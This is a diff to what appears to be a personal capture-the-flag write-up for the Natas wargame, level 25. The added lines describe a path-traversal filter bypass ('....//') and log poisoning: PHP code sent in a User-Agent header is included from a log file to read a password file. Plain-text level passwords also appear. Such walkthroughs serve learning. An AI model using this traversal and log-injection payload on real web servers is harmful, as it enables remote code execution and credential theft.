@@ -128,3 +128,12 @@ natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c
 The custom `safe_include()` function simply uses a blacklist to try and prevent path traversal.
 As we all know, blacklists are bad. I visited PayloadAllTheThings and found `....//` to escape filters.
 It seems to work, `?lang=....//index-source.html` gives me the source of the page.
+I noticed that `include()` executes php code, so if we could include an input of ours, we can have RCE.
+`logRequest` will serve this purpose: it outputs our user agent to a log file. Change the user agent to php code and include the log file.
+```
+GET /?lang=....//logs/natas25_<your_session_id>.log HTTP/1.1
+User-Agent: <?php echo(file_get_contents("/etc/natas_webpass/natas26")); ?>
+```
+
+natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+
